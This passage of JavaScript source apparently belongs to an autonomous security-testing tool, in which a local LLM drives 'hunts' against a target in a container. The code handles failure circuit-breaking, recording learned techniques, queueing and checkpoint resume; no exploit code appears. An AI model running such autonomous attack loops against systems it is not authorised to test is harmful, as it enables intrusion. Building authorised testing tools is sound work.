      // CIRCUIT BREAKER: if the AI brain fails repeatedly (Ollama too slow
      // on 2vCPU, model down, etc.), pause the hunt with a clear message
      // instead of spinning forever doing nothing.
      let iterResult = null;
      try {
        iterResult = await agentIteration(huntId, target, recon, findings, i, playbook);
      } catch (err) {
        // DIAG (18 Oct 2026): log the stack's first frames so a recurring
        // ReferenceError (e.g. "reply is not defined") reveals its exact
        // file:line instead of failing silently 8+ iterations in a row.
        const stackHint = err && err.stack ? String(err.stack).split('\n').slice(1, 4).join(' <- ').slice(0, 400) : 'no-stack';
        think(huntId, `Iteration ${i} failed safely: ${err.message || err} :: ${stackHint}`);
      }
      if (iterResult === null || (iterResult && iterResult.aiOk === false)) {
        aiFailStreak++;
        aiFailKinds.push((iterResult && iterResult.failKind) || 'unknown');
        // Circuit breaker trips at 5 consecutive failures (was 3). The 8B model
        // on 2vCPU is flaky — occasional malformed JSON or slow replies are
        // normal, not a brain outage. 5 still stops a truly dead brain quickly.
        if (aiFailStreak >= 5) {
          // Honest pause reason: report WHAT failed, not a blanket "unreachable".
          // 'ai_no_reply' = brain gave nothing back (timeout/wedge),
          // 'ai_error' = the brain call threw, 'ai_bad_output' = brain replied
          // but produced no usable plan (a model-quality issue, not downtime).
          const kinds = aiFailKinds.slice(-3);
          const topKind = kinds
            .slice()
            .sort((a, b) => kinds.filter((k) => k === b).length - kinds.filter((k) => k === a).length)[0] || 'unknown';
          const pauseReason = `ai_${topKind}`;
          const kindLabels = {
            no_reply: 'AI brain gave no reply',
            error: 'AI brain call threw an error',
            bad_output: 'AI brain replied but produced no usable plan',
            unknown: 'AI brain failed',
          };
          const label = kindLabels[topKind] || kindLabels.unknown;
          think(huntId, `${label} ${aiFailStreak}x in a row — pausing hunt. Resume when it's responsive.`);
          appendHuntEvent(huntId, { type: 'status', state: 'paused', reason: pauseReason, at: new Date().toISOString() });
          try {
            writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'paused', pausedReason: pauseReason });
          } catch { /* best-effort */ }
          // Return early — do NOT fall through to "finished". This hunt is
          // paused, not done. Resume will pick up from the checkpoint.
          try {
            await teardownHuntContainer(huntId);
            appendHuntEvent(huntId, { type: 'status', state: 'container_destroyed' });
          } catch { /* ignore */ }
          return;
        }
      } else {
        aiFailStreak = 0;
        aiFailKinds = [];
      }

      // Gentle pacing — don't hammer the target
      await new Promise((r) => setTimeout(r, 2000));
    }

    // Final analysis over all findings
    try {
      const analysis = analyzeFindings(findings);
      appendHuntEvent(huntId, { type: 'status', state: 'analysis', summary: analysis });
    } catch { /* ignore */ }

    // Learning: record what worked so future hunts get smarter
    try {
      recordHuntExperience({
        huntId,
        target,
        profile: { type: recon.profile },
        techniques: findings.map((f) => ({ name: f.class || 'unknown', triedAt: new Date().toISOString() })),
        findings,
      });
      think(huntId, 'Hunt experience recorded — future hunts learn from this one.');
    } catch { /* ignore */ }

    think(huntId, `Hunt finished: ${findings.length} findings (${findings.filter((f) => f.verified).length} verified).`);
    appendHuntEvent(huntId, { type: 'status', state: 'finished', findings: findings.length });
    try {
      writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'finished' });
    } catch { /* meta is best-effort here */ }

    // QUEUE: auto-start next hunt if queued
    try {
      const { dequeueNextHunt } = await import('./store.js');
      const next = dequeueNextHunt();
      if (next) {
        console.log(`[hunt] Queue: auto-starting ${next.queueId} for ${next.username} (target: ${next.target})`);
        // Import and call the hunt creation (deferred to avoid circular imports)
        const { default: createHunt } = await import('./huntCreator.js').catch(() => ({ default: null }));
        if (createHunt) {
          createHunt(next).catch((err) => console.error('[hunt] queue auto-start failed:', err.message));
        } else {
          // Fallback: log for manual start (huntCreator not yet implemented)
          console.log(`[hunt] Queue: next hunt ready (manual): ${JSON.stringify(next)}`);
        }
      }
    } catch (err) {
      console.error('[hunt] queue auto-start check failed:', err.message);
    }
  } catch (err) {
    appendHuntEvent(huntId, { type: 'status', state: 'failed', error: err.message || String(err) });
    try {
      writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'failed' });
    } catch { /* meta is best-effort here */ }
  } finally {
    // Always clean up the container
    try {
      await teardownHuntContainer(huntId);
      appendHuntEvent(huntId, { type: 'status', state: 'container_destroyed' });
    } catch { /* ignore */ }
  }
}

/**
 * Resume a hunt that was interrupted (backend killed/restarted mid-run).
 * Reads the checkpoint from the hunt's memory folder (meta.json) and the
 * findings from the persisted event log, then continues the agent loop from
 * the next iteration — never from zero.
 *
 * Returns true if a resume was launched, false if there was nothing to resume
 * (hunt already stopped/finished/paused, or no checkpoint).
 */
export async function resumeInterruptedHunt(huntId) {
  const meta = readHuntMeta(huntId);
  if (!meta || meta.state !== 'running') return false;
  // Clear stale pause indicators — a resume is an explicit un-pause.
  // If pausedReason is left set, isPaused() returns true (defensive fix)
  // and the loop gets stuck in waitWhilePaused() instead of hunting.
  if (meta.pausedReason || meta.paused) {
    writeHuntMeta(huntId, { ...meta, paused: false, pausedReason: null });
  }
  const { target, mode, userId } = meta;
  if (!target) return false;

  // Rebuild findings from the persisted event log (strip the event wrapper).
  const findings = [];
  try {
    for (const e of readHuntEvents(huntId)) {
      if (e && e.type === 'finding') {
        const { type, cachedAt, ...f } = e;
        findings.push(f);
      }
    }
  } catch { /* findings are best-effort */ }

  const lastIteration = Number(meta.iteration) || 0;
  appendHuntEvent(huntId, {
    type: 'status',
    state: 'resumed_from_checkpoint',
    fromIteration: lastIteration + 1,
    findingsRecovered: findings.length,
    at: new Date().toISOString(),
  });
  // Fire and forget — the loop drives itself from here.
  runAutonomousHunt(huntId, target, mode || 'normal', userId || null, {
    isResume: true,
    startIteration: lastIteration + 1,
    findings,
  }).catch((err) => {
    appendHuntEvent(huntId, { type: 'status', state: 'failed', error: err.message || String(err) });
    try {
      writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'failed' });
    } catch { /* ignore */ }
  });
  return true;
}
